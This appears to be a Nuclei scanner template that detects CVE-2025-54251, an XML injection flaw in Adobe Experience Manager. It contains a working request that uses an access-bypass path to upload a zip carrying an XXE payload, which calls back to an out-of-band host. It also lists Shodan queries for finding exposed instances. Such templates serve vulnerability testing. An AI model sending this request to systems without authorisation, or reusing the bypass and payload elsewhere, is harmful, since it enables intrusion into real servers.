http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_any(body,'success')
    - contains(interactsh_protocol, 'http')
    type: dsl
  raw:
  - 'POST /crx/packmgr/service/exec.json;x=''x/graphql/execute/json/x''?cmd=upload&jsonInTextarea=true
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: hopgoblin/1.0

    Content-Type: multipart/form-data; boundary={{boundary}}


    --{{boundary}}

    Content-Disposition: form-data; name="package"; filename="{{filename}}.zip"

    Content-Type: application/zip


    {{zip(''META-INF/vault/privileges.xml'',xxe_payload)}}

    --{{boundary}}--

    '
id: CVE-2025-54251
info:
  author: DhiyaneshDK,assetnote
  classification:
    cpe: cpe:2.3:a:adobe:experience_manager:6.5:-:*:*:lts:*:*:*
    cve-id: CVE-2025-54251
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 4.3
    cwe-id: CWE-91
    epss-percentile: 0.94931
    epss-score: 0.18003
  description: 'Adobe Experience Manager versions 6.5.23.0 and earlier are affected
    by an XML Injection vulnerability that could result in a Security feature bypass.

    '
  impact: 'Attackers can inject malicious XML payloads to bypass security features
    and potentially access sensitive information through external entity references.

    '
  metadata:
    max-request: 1
    product: experience_manager
    shodan-query:
    - http.title:"aem sign in"
    - http.component:"adobe experience manager"
    - cpe:"cpe:2.3:a:adobe:experience_manager"
    vendor: adobe
    verified: true
  name: "Adobe Experience Manager \u2264 6.5.23.0 - XML Injection"
  reference:
  - https://github.com/assetnote/hopgoblin/blob/main/hopgoblin.py
  - https://nvd.nist.gov/vuln/detail/CVE-2025-54251
  - https://helpx.adobe.com/security/products/experience-manager/apsb25-90.html
  remediation: 'Upgrade Adobe Experience Manager to a version later than 6.5.23.0
    that properly disables external entity processing in XML uploads.

    '
  severity: medium
  tags: cve,2025,adobe,aem,xxe,oast,oob,intrusive,vuln,vkev
variables:
  boundary: '{{hex_encode(rand_text_alphanumeric(32))}}'
  filename: '{{to_lower(rand_text_alpha(5))}}'
  marker: '{{randstr}}'
  xxe_payload: <!DOCTYPE x [<!ENTITY foo SYSTEM "http://{{interactsh-url}}/{{marker}}">]><x>&foo;</x>
